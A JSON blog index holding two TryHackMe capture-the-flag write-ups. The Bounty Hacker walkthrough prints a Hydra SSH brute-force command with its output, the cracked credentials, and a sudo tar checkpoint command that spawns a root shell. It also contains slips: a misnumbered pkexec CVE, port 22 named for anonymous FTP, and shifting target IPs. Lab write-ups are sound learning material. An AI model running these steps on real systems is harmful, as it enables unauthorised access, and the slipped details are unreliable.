[
  
  {
    "title": "Pickle Rick - TryHackMe",
    "url": "/posts/PickleRick/",
    "categories": "Blogging, TryHackme",
    "tags": "writeup",
    "date": "2022-09-05 11:42:24 +0000",
    





    "snippet": "This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.Room DescriptionReconNmapFirst I started off by conducting an Nmap scan on the target.$ nmap -sV -p- -vv -oN nmap 10.10.43.157 $ nmap -sV -p- -vv -oN nmap 10.10.43.157Initiating Connect Scan at 21:51Scanning 10.10.43.157 [65535 ports]Discovered open port 22/tcp on 10.10.43.157Discovered open port 80/tcp on 10.10.43.157Nmap ScanLet’s check port 80Port 80port 80There is nothing interesting here let’s try to check the Source Code.When you inspect the code you will see something very interesting, Saw a comment:$ curl 10.10.73.218 ...  &lt;!--    Note to self, remember username!    Username: R1ckRul3s  --&gt;&lt;/body&gt;&lt;/html&gt;source code inspectionNow we have a Username: R1ckRul3sLet’s check for more.Gobuster ScanRobots.txt DirectoryFound something in this directory: Wubbalubbadubdub. This might help us somewhere.   Let’s continue to gather more info about the target.  Example line for prompt."
  },
  
  {
    "title": "Bounty Hacker - TryHackMe",
    "url": "/posts/BountyHacker/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-09-04 06:42:24 +0000",
    





    "snippet": "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine.Room DescriptionLet’s do this…NmapFirst of all I love to start by conducting an Nmap scan on the target.$ nmap -sV -p- -vv -oN nmap {Target_IP}Initiating Connect Scan at 15:13Scanning 10.10.181.69 [65535 ports]Discovered open port 80/tcp on 10.10.181.69Discovered open port 21/tcp on 10.10.181.69Discovered open port 22/tcp on 10.10.181.69Port 80First Let’s start with port 80.Port 80Went through the source code and nothing was interesting. Port 21File Transfer Protocal Service runs on port 21. The File Transfer Protocol provides a framework to transfer information between two networked computers, much like Hypertext Transfer Protocol does through a web browser.I tried to login to this port anonymously and it was successful.ftp 10.10.195.119Connected to 10.10.195.119.220 (vsFTPd 3.0.3)Name (10.10.149.154:nesh): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp Service on port 21I downloaded all the files from this port using the Mget * command.The two texts files were:Locks.txtandtask.txt$ cat task.txt1.) Protect Vicious.2.) Plan for Red Eye pickup on the moon.-linFrom the task.txt we gather that we have a user whose name is lin Username: linOn the other hand the other file seemed to be a password container. With this file, we could perform a password dictionary attack using a tool known as Hydra.Performing the attack on Port 22Port 22The options we pass into Hydra depends on which service (protocol) we’re attacking. For example if we wanted to bruteforce SSH with the username being user and a password list being locks.txt, we’d use the following command:hydra -l lin -P /home/nesh/tryhackme/BountyHacker 10.10.195.119  -t 4 sshHydra Password attackHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-04 21:23:38[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task[DATA] attacking ssh://10.10.149.154:22/[22][ssh] host: 10.10.149.154   login: lin   password: RedDr4gonSynd1cat31 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-04 21:23:49Username: lin Password: RedDr4gonSynd1cat3Now that we have the needed credentials to ssh to the machine, Let’s do it …$ ssh lin@10.10.149.154SSH Login on port 22Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14lin@bountyhacker:~/Desktop$ lsuser.txtlin@bountyhacker:~/Desktop$ cat user.txt THM{CR1M3_SyNd1C4T3}lin@bountyhacker:~/Desktop$ Priviledge EscalationThere are two ways to escalate priviledges to root:Method 1 : Using Linpeas ScriptFor PrevEsc I love running linpeas script. To scan for vulnerabilities in the target system. I uploaded the linpeas script to my port 80, so that I can go on the target machine to /tmp directory and run the script.Local hostI need to go to the /tmp to download the script to the script.Linpeas ScriptIt’s time to run the script …$ ./linpeas.shLinpeas ScriptFound the target was vulnerable to CVE-2020-4034.CVE-2020-4034A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn’t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.There are two versions of the CVE exploit: Python3 Exploit C language exploitI uploaded the CVE exploit to my port 80 and went to the target machine and downloaded it there.After running the script I was in root group. And collected the root flag root.txtTHM{80UN7Y_h4cK3r}Machine Pwnedmethod 2: Using GTFOBINsGTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.lin@bountyhacker:/tmp$ sudo -l[sudo] password for lin: Matching Defaults entries for lin on bountyhacker:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser lin may run the following commands on bountyhacker:    (root) /bin/tarUsing the command $ sudo -l , we see that the user lin can run the /bin/tar command with root priviledges.Let’s see what GTFOBINS has for us …GTFOBINS GithubNow let’s run the command on our target..sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shMachine PwnedThere is need upgrade the shell$ python3 -c \"import pty;pty.spawn('/bin/bash')\"And collected the root flag:$ cat /root/root.txtTHM{80UN7Y_h4cK3r}Summary  From the Nmap scan, we found 3 open ports i.e          Port 21 (ftp)      Port 22 (ssh)      Port 80 (http)        Port 22 allowed anonymous login. After the succesful login I found 2 files on the ftp server. locks.txt, note.txt. After I opened note.txt I found Username lin and on the other file I found some password stored iin the file.  I used locks.txt as my dictionary to Bruteforce the ssh login using a tool known as hydra.  I found lin's password and used that to login to the machine using ssh.  I found that I could escalate my previledges using 2 methods:          Linpeas script      GTFOBINS Github        With this 2 methods I Pwned the machineIt was indeed a lot of fun. I hope you enjoyed reading through it."
  }
  
]

